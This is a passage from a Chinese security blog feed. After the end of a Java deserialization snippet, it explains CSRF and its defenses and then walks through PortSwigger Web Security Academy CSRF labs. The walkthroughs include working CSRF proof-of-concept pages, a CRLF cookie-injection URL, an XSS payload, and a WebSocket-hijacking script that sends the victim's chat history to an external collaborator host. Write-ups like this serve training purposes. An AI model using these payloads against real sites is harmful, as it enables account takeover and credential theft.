class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>byteArrayInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> field<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">{</span>        <span class="token class-name">Field</span> targetField <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>        targetField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        targetField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5. 参考链接"></a>5. 参考链接</h2><p><a href="https://github.com/frohoff/ysoserial">ysoserial</a></p>]]></content>
      
      
      <categories>
          
          <category> Java 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC 链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF 原理&amp;攻击</title>
      <link href="/2023/01/28/skilllearning/csrf/csrf-yuan-li-gong-ji/"/>
      <url>/2023/01/28/skilllearning/csrf/csrf-yuan-li-gong-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF-原理-amp-攻击"><a href="#CSRF-原理-amp-攻击" class="headerlink" title="CSRF 原理&amp;攻击"></a>CSRF 原理&amp;攻击</h1><h2 id="1-CSRF-原理"><a href="#1-CSRF-原理" class="headerlink" title="1. CSRF 原理"></a>1. CSRF 原理</h2><p>CSRF（Cross Site Request Forgery, 跨站请求伪造）是一种网络的攻击方式，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF。</p><p>CSRF漏洞是因为web应用程序在用户进行敏感操作时，如修改账号密码、添加账号、转账等，没有校验表单token或者http请求头中的referer值，从而导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为。</p><p><img src="/../../../../pic/Pasted%20image%2020230305213056.png"></p><p><img src="/../../../../pic/Pasted%20image%2020230305213101.png"></p><h2 id="2-CSRF-的高危触发点"><a href="#2-CSRF-的高危触发点" class="headerlink" title="2. CSRF 的高危触发点"></a>2. CSRF 的高危触发点</h2><ol><li>论坛交流</li><li>用户中心</li><li>反馈留言</li><li>交易管理</li><li>后台管理</li></ol><h2 id="3-CSRF-漏洞的危害"><a href="#3-CSRF-漏洞的危害" class="headerlink" title="3. CSRF 漏洞的危害"></a>3. CSRF 漏洞的危害</h2><ul><li>伪造HTTP请求进行未授权操作</li><li>篡改、盗取目标网站上的重要用户数据</li><li>未经允许执行对用户名誉或者资产有害的操作，比如：散播不良信息、进行消费等</li><li>如果通过使用社工等方式攻击网站管理员，会危害网站本身的安全性</li><li>作为其他攻击向量的辅助攻击手法，比如配合XSS</li><li>传播CSRF蠕虫</li></ul><h2 id="4-CSRF-防御措施"><a href="#4-CSRF-防御措施" class="headerlink" title="4. CSRF 防御措施"></a>4. CSRF 防御措施</h2><ul><li>Referer验证</li></ul><p>根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。比如某银行的转账是通过用户访问 <code>http://bank.test/test?page=10&amp;userID=101&amp;money=10000</code> 页面完成，用户必须先登录bank.test，然后通过点击页面上的按钮来触发转账事件。当用户提交请求时，该转账请求的Referer值就会是转账按钮所在页面的URL（本例中，通常是以bank. test域名开头的地址）。而如果攻击者要对银行网站实施CSRF攻击，他只能在自己的网站构造请求，当用户通过攻击者的网站发送请求到银行时，该请求的Referer是指向攻击者的网站。因此，要防御CSRF攻击，银行网站只需要对于每一个转账请求验证其Referer值，如果是以bank. test开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。</p><ul><li>Token验证</li></ul><p>CSRF攻击之所以能够成功，是因为攻击者可以伪造用户的请求，该请求中所有的用户验证信息都存在于Cookie中，因此攻击者可以在不知道这些验证信息的情况下直接利用用户自己的Cookie来通过安全验证。由此可知，抵御CSRF攻击的关键在于：在请求中放入攻击者所不能伪造的信息，并且该信息不存在于Cookie之中。鉴于此，系统开发者可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。</p><ul><li>增加验证码验证</li></ul><p>Spring security的表单验证是通过过滤器链中的 UsernamePasswordAuthenticationFilter 来完成的，我们增加的验证码过滤器应该插在 UsernamePasswordAuthenticationFilter 之前，如果验证码校验不通过，直接返回，无需进行账户密码的校验。</p><h2 id="5-CSRF-攻击"><a href="#5-CSRF-攻击" class="headerlink" title="5. CSRF 攻击"></a>5. CSRF 攻击</h2><p><a href="https://portswigger.net/web-security/csrf">PortSwigger - CSRF</a></p><h3 id="1-Lab-CSRF-vulnerability-with-no-defenses"><a href="#1-Lab-CSRF-vulnerability-with-no-defenses" class="headerlink" title="1. Lab: CSRF vulnerability with no defenses"></a>1. Lab: CSRF vulnerability with no defenses</h3><ul><li>题目描述</li></ul><p>This lab’s email change functionality is vulnerable to CSRF.</p><p>To solve the lab, craft some HTML that uses a&nbsp;<a href="https://portswigger.net/web-security/csrf">CSRF attack</a>&nbsp;to change the viewer’s email address and upload it to your exploit server.</p><p>You can log in to your own account using the following credentials:&nbsp;<code>wiener:peter</code></p><ul><li>题目解析</li></ul><p>目标为修改浏览者的 email 地址</p><p>访问 hoem 并且使用给出的测试用户登录</p><p><img src="/../../../../../pic/Pasted%20image%2020230305213723.png"></p><p>找到修改 Email 的功能点，进行抓包</p><p><img src="/../../../../../pic/Pasted%20image%2020230305213933.png"></p><p>获得了数据包</p><p><img src="/../../../../../pic/Pasted%20image%2020230305214110.png"></p><p>右键选择生成 CSRF POC</p><p><img src="/../../../../../pic/Pasted%20image%2020230305214232.png"></p><p>由于不会手动点击提交按钮，所以在选项中勾选自动提交脚本，然后重新生成</p><p><img src="/../../../../../pic/Pasted%20image%2020230305214336.png"></p><p>前往攻击页面</p><p><img src="/../../../../../pic/Pasted%20image%2020230305214535.png"></p><p>运行结果</p><p><img src="/../../../../../pic/Pasted%20image%2020230305214836.png"></p><p>成功执行</p><h3 id="2-Lab-CSRF-where-token-validation-depends-on-request-method"><a href="#2-Lab-CSRF-where-token-validation-depends-on-request-method" class="headerlink" title="2. Lab: CSRF where token validation depends on request method"></a>2. Lab: CSRF where token validation depends on request method</h3><ul><li>题目描述</li></ul><p>This lab’s email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.</p><p>To solve the lab, use your exploit server to host an HTML page that uses a&nbsp;<a href="https://portswigger.net/web-security/csrf">CSRF attack</a>&nbsp;to change the viewer’s email address.</p><p>You can log in to your own account using the following credentials:&nbsp;<code>wiener:peter</code></p><ul><li>题目解析</li></ul><p>只对某些请求方式做了防御，在此次攻击测试中尝试通过修改请求方式进行绕过</p><p><img src="/../../../../../pic/Pasted%20image%2020230305220138.png"></p><p>当修改 csrf 时会因为过不了验证而拒绝服务</p><p><img src="/../../../../../pic/Pasted%20image%2020230305220237.png"></p><p>修改请求方式为 GET</p><p><img src="/../../../../../pic/Pasted%20image%2020230305220303.png"></p><p>此时不再验证 csrf ，生成 POC</p><p><img src="/../../../../../pic/Pasted%20image%2020230305220352.png"></p><p>前往漏洞利用页面提交</p><p><img src="/../../../../../pic/Pasted%20image%2020230305220424.png"></p><h3 id="3-Lab-CSRF-where-token-validation-depends-on-token-being-present"><a href="#3-Lab-CSRF-where-token-validation-depends-on-token-being-present" class="headerlink" title="3. Lab: CSRF where token validation depends on token being present"></a>3. Lab: CSRF where token validation depends on token being present</h3><ul><li>题目描述</li></ul><p>This lab’s email change functionality is vulnerable to CSRF.</p><p>To solve the lab, use your exploit server to host an HTML page that uses a&nbsp;<a href="https://portswigger.net/web-security/csrf">CSRF attack</a>&nbsp;to change the viewer’s email address.</p><p>You can log in to your own account using the following credentials:&nbsp;<code>wiener:peter</code></p><ul><li>题目解析</li></ul><p>继续抓包</p><p><img src="/../../../../../pic/Pasted%20image%2020230305221347.png"></p><p>禁用了 GET 请求方式，尝试修改其他的请求方式也无果</p><p><img src="/../../../../../pic/Pasted%20image%2020230305224135.png"></p><p>直接将 csrf 参数删除发现也能进行修改</p><p><img src="/../../../../../pic/Pasted%20image%2020230305224231.png"></p><p>生成对应 POC</p><p><img src="/../../../../../pic/Pasted%20image%2020230305224419.png"></p><p>成功修改</p><h3 id="4-Lab-CSRF-where-token-is-not-tied-to-user-session"><a href="#4-Lab-CSRF-where-token-is-not-tied-to-user-session" class="headerlink" title="4. Lab: CSRF where token is not tied to user session"></a>4. Lab: CSRF where token is not tied to user session</h3><ul><li>题目描述</li></ul><p>This lab’s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren’t integrated into the site’s session handling system.</p><p>To solve the lab, use your exploit server to host an HTML page that uses a&nbsp;<a href="https://portswigger.net/web-security/csrf">CSRF attack</a>&nbsp;to change the viewer’s email address.</p><p>You have two accounts on the application that you can use to help design your attack. The credentials are as follows:</p><ul><li><code>wiener:peter</code></li><li><code>carlos:montoya</code></li></ul><ul><li>题目解析</li></ul><p>这次给了两个账户，依旧是抓包测试</p><p>先使用 wiener 用户</p><p><img src="/../../../../../pic/Pasted%20image%2020230305232834.png"></p><p>通过测试发现每个 token 只能使用一次</p><p>该 token 可以在提交修改时生成，在修改时抓包获取 token</p><p><img src="/../../../../../pic/Pasted%20image%2020230305233007.png"></p><p>拿着生成的新 token 访问</p><p><img src="/../../../../../pic/Pasted%20image%2020230305233031.png"></p><p>修改成功</p><p><img src="/../../../../../pic/Pasted%20image%2020230305233056.png"></p><p>抓包先获取一个新的 token 然后构造 POC</p><p><img src="/../../../../../pic/Pasted%20image%2020230305233202.png"></p><p>前去执行</p><p><img src="/../../../../../pic/Pasted%20image%2020230305233243.png"></p><h3 id="5-Lab-CSRF-where-token-is-tied-to-non-session-cookie"><a href="#5-Lab-CSRF-where-token-is-tied-to-non-session-cookie" class="headerlink" title="5. Lab: CSRF where token is tied to non-session cookie"></a>5. Lab: CSRF where token is tied to non-session cookie</h3><ul><li>题目描述</li></ul><p>This lab’s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren’t fully integrated into the site’s session handling system.</p><p>To solve the lab, use your exploit server to host an HTML page that uses a&nbsp;<a href="https://portswigger.net/web-security/csrf">CSRF attack</a>&nbsp;to change the viewer’s email address.</p><p>You have two accounts on the application that you can use to help design your attack. The credentials are as follows:</p><ul><li><code>wiener:peter</code></li><li><code>carlos:montoya</code></li></ul><ul><li>题目解析</li></ul><p>抓包</p><p><img src="/../../../../../pic/Pasted%20image%2020230305234044.png"></p><p>两个参数少一个都不行，猜测两个绑定在一起进行验证</p><p>所以怎么样才能将 cookie 传入进去呢</p><p>主页面还有一个搜索的功能</p><p><img src="/../../../../../pic/Pasted%20image%2020230305234946.png"></p><p>在 Set-Cookie 中插入了我们搜索的内容，在此处插入自定义响应头</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">/?search=test%0d%0aSet-Cookie:%20csrfKey=SY6driHbxFn7lzMuQnGjXCp2ymVhGYc8 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230305235112.png"></p><p>成功插入 cookie</p><p>构造 POC，这里不适用 script 脚本，而是使用 img 标签请求 URL 并触发 submit</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>  <span class="token comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://0ab800a20314c7eec1abda9200ee0083.web-security-academy.net/my-account/change-email<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token entity" title="@">&amp;#64;</span>test<span class="token entity" title=".">&amp;#46;</span>com<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VNTa3JmVIapxN7p0D6gocIyugw6W6r6V<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://0ab800a20314c7eec1abda9200ee0083.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=SY6driHbxFn7lzMuQnGjXCp2ymVhGYc8%3b%20SameSite=None<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230306001156.png"></p><h3 id="6-Lab-CSRF-where-token-is-duplicated-in-cookie"><a href="#6-Lab-CSRF-where-token-is-duplicated-in-cookie" class="headerlink" title="6. Lab: CSRF where token is duplicated in cookie"></a>6. Lab: CSRF where token is duplicated in cookie</h3><ul><li>题目描述</li></ul><p>This lab’s email change functionality is vulnerable to CSRF. It attempts to use the insecure “double submit” CSRF prevention technique.</p><p>To solve the lab, use your exploit server to host an HTML page that uses a&nbsp;<a href="https://portswigger.net/web-security/csrf">CSRF attack</a>&nbsp;to change the viewer’s email address.</p><p>You can log in to your own account using the following credentials:&nbsp;<code>wiener:peter</code></p><ul><li>题目解析</li></ul><p>依旧是进行抓包</p><p><img src="/../../../../../pic/Pasted%20image%2020230306002434.png"></p><p>这次的 token 与 cookie 值相同</p><p>同时修改后发现还能通过验证</p><p><img src="/../../../../../pic/Pasted%20image%2020230306002542.png"></p><p>其余方式与前面的利用方式一样</p><p>构造 POC</p><pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;    &lt;script&gt;history.pushState('', '', '/');&lt;/script&gt;    &lt;form action="https://0a8a0058034fa270c06c9ace00800007.web-security-academy.net/my-account/change-email" method="POST"&gt;      &lt;input type="hidden" name="email" value="test&amp;#64;test&amp;#46;com" /&gt;      &lt;input type="hidden" name="csrf" value="hHIWwFlFtNZEgENqjxVgkZkM5yNuvc45" /&gt;      &lt;input type="submit" value="Submit request" /&gt;    &lt;/form&gt;&lt;img src="https://0a8a0058034fa270c06c9ace00800007.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=hHIWwFlFtNZEgENqjxVgkZkM5yNuvc45%3b%20SameSite=None" onerror="document.forms[0].submit()"&gt;  &lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230306003111.png"></p><h3 id="7-Lab-SameSite-Lax-bypass-via-method-override"><a href="#7-Lab-SameSite-Lax-bypass-via-method-override" class="headerlink" title="7. Lab: SameSite Lax bypass via method override"></a>7. Lab: SameSite Lax bypass via method override</h3><ul><li>题目描述</li></ul><p>This lab’s change email function is vulnerable to CSRF. To solve the lab, perform a&nbsp;<a href="https://portswigger.net/web-security/csrf">CSRF attack</a>&nbsp;that changes the victim’s email address. You should use the provided exploit server to host your attack.</p><p>You can log in to your own account using the following credentials:&nbsp;<code>wiener:peter</code></p><ul><li>题目解析</li></ul><p>利用 <code>_method</code> 方法覆盖绕过 <a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-lax-restrictions-using-get-requests">SameSite</a> 限制</p><p>构造 POC</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt; document.location = "https://0aa700b00472e8d8c1ffdaed00990025.web-security-academy.net/my-account/change-email?email=test@test.net&amp;_method=POST"; &lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230306010111.png"></p><h3 id="8-Lab-SameSite-Strict-bypass-via-client-side-redirect"><a href="#8-Lab-SameSite-Strict-bypass-via-client-side-redirect" class="headerlink" title="8. Lab: SameSite Strict bypass via client-side redirect"></a>8. Lab: SameSite Strict bypass via client-side redirect</h3><ul><li>题目描述</li></ul><p>This lab’s change email function is vulnerable to CSRF. To solve the lab, perform a&nbsp;<a href="https://portswigger.net/web-security/csrf">CSRF attack</a>&nbsp;that changes the victim’s email address. You should use the provided exploit server to host your attack.</p><p>You can log in to your own account using the following credentials:&nbsp;<code>wiener:peter</code></p><ul><li>题目解析</li></ul><p>工具题目可知需要利用到重定向</p><p>先走下正常的修改流程</p><p><img src="/../../../../../pic/Pasted%20image%2020230306204018.png"></p><p>没什么特别的</p><p><img src="/../../../../../pic/Pasted%20image%2020230306205134.png"></p><p>修改为 GET 方式也能进行修改</p><p>在页面下还存在评论功能</p><p><img src="/../../../../../pic/Pasted%20image%2020230306210722.png"></p><p>评论后页面 302 重定向到 <code>/post/comment/confirmation</code>  页面中</p><p><img src="/../../../../../pic/Pasted%20image%2020230306210815.png"></p><p><code>/post/comment/confirmation</code> 下又调用了 <code>/resources/js/commentConfirmationRedirect.js</code> 脚本</p><p>该脚本内容</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function-variable function">redirectOnConfirmation</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">blogPath</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> postId <span class="token operator">=</span> url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"postId"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        window<span class="token punctuation">.</span>location <span class="token operator">=</span> blogPath <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> postId<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将 postId 拼接后进行重定向，这里的 postId 可控即可控制任意 URL 地址</p><p>结合之前通过 GET 方式修改 email 地址</p><p>构造 POC</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span> document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=6/../../my-account/change-email%3femail%3dwiener%40wiener.com%26submit%3d1"</span><span class="token punctuation">;</span> <span class="token operator">&lt;</span><span class="token operator">/</span>script<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230306211703.png"></p><h3 id="9-Lab-SameSite-Strict-bypass-via-sibling-domain"><a href="#9-Lab-SameSite-Strict-bypass-via-sibling-domain" class="headerlink" title="9. Lab: SameSite Strict bypass via sibling domain"></a>9. Lab: SameSite Strict bypass via sibling domain</h3><p>#CSRF-WebSocket</p><ul><li>题目描述</li></ul><p>This lab’s live chat feature is vulnerable to&nbsp;<a href="https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking">cross-site WebSocket hijacking</a>&nbsp;(<a href="https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking">CSWSH</a>). To solve the lab, log in to the victim’s account.</p><p>To do this, use the provided exploit server to perform a CSWSH attack that exfiltrates the victim’s chat history to the default Burp Collaborator server. The chat history contains the login credentials in plain text.</p><p>If you haven’t done so already, we recommend completing our topic on&nbsp;<a href="https://portswigger.net/web-security/websockets">WebSocket vulnerabilities</a>&nbsp;before attempting this lab.</p><ul><li>题目解析</li></ul><p>这次没给测试用户，在登录用户处的 username 处存在 XSS 注入</p><p>POC</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">[GET]/login?username="/&gt;&lt;script&gt;alert('xssss')&lt;/script&gt;&amp;password=admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230306214715.png"></p><p>可以在此处执行 script 脚本</p><p>同时还存在一个在线聊天室</p><p><img src="/../../../../../pic/Pasted%20image%2020230306214913.png"></p><p>通过 WebSocket 传送消息</p><p><img src="/../../../../../pic/Pasted%20image%2020230306215153.png"></p><p>进行一些会话没给出什么有用的信息</p><p>刷新页面</p><p><img src="/../../../../../pic/Pasted%20image%2020230306221521.png"></p><p><img src="/../../../../../pic/Pasted%20image%2020230306221529.png"></p><p>客户端向服务端发送一个 READY，然后服务端将所有的聊天记录发送到客户端</p><p>当未携带 Cookie 发送 Websocket 时</p><p><img src="/../../../../../pic/Pasted%20image%2020230306222541.png"></p><p>会返回一个新的会话以及设置 SameSite=Strict，这会阻止浏览器表单，包括 Cookie。</p><p><img src="/../../../../../pic/Pasted%20image%2020230306223158.png"></p><p>在资源请求 <code>/resources/images/shop.svg</code> 时使用到了另一个域 <code>cms-0abc000d0342c139c2296b1b002c0025.web-security-academy.net</code></p><p>访问之后</p><p><img src="/../../../../../pic/Pasted%20image%2020230306223346.png"></p><p>在 username 处仍然存在 XSS 注入</p><p>由于此同级域是同一站点的一部分，因此您可以使用此 XSS 启动 CSWSH 攻击，而不会受到 SameSite 限制的缓解。</p><p>编写个 POC</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;    var ws = new WebSocket('wss://0abc000d0342c139c2296b1b002c0025.web-security-academy.net/chat');    ws.onopen = function() {        ws.send("READY");    };    ws.onmessage = function(event) {        fetch('https://6t0lypkq9ngkxupju6m15nn3buhl5ft4.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});    };    ws.send("Hello");&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>建立一个 WebSocket 会话并且发送数据，在接收到消息时将消息发送到对应的服务器上</p><p><img src="/../../../../../pic/Pasted%20image%2020230306215934.png"></p><p>获取到了响应信息也只有一条，由于 SameSite 的限制也只会有一条，并不能获取到完整的聊天记录</p><p>因此可以利用之前的 XSS 漏洞进行攻击（同源）</p><p>构造 Payload</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">[GET]/login?username="/&gt;%3Cscript%3E%0A%20%20%20%20var%20ws%20%3D%20new%20WebSocket%28%27wss%3A%2F%2F0abc000d0342c139c2296b1b002c0025.web-security-academy.net%2Fchat%27%29%3B%0A%20%20%20%20ws.onopen%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20ws.send%28%22READY%22%29%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20ws.onmessage%20%3D%20function%28event%29%20%7B%0A%20%20%20%20%20%20%20%20fetch%28%27https%3A%2F%2F6t0lypkq9ngkxupju6m15nn3buhl5ft4.oastify.com%27%2C%20%7Bmethod%3A%20%27POST%27%2C%20mode%3A%20%27no-cors%27%2C%20body%3A%20event.data%7D%29%3B%0A%20%20%20%20%7D%3B%0A%3C%2Fscript%3E&amp;password=anything<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020230306221854.png"></p><p>获取到了聊天记录</p><p>接下来编写 POC 使服务端触发</p><p><strong>绕过同站点限制</strong></p><p>我们重用以前的漏洞并对其进行 URL 编码。然后，我们使用以下新漏洞。我们在用户名参数中包含 URL 编码的有效负载。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"https://cms-0abc000d0342c139c2296b1b002c0025.web-security-academy.net/login?username=\"/&gt;%3Cscript%3E%0A%20%20%20%20var%20ws%20%3D%20new%20WebSocket%28%27wss%3A%2F%2F0abc000d0342c139c2296b1b002c0025.web-security-academy.net%2Fchat%27%29%3B%0A%20%20%20%20ws.onopen%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20ws.send%28%22READY%22%29%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20ws.onmessage%20%3D%20function%28event%29%20%7B%0A%20%20%20%20%20%20%20%20fetch%28%27https%3A%2F%2F6t0lypkq9ngkxupju6m15nn3buhl5ft4.oastify.com%27%2C%20%7Bmethod%3A%20%27POST%27%2C%20mode%3A%20%27no-cors%27%2C%20body%3A%20event.data%7D%29%3B%0A%20%20%20%20%7D%3B%0A%3C%2Fscript%3E&amp;password=anything"</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里的 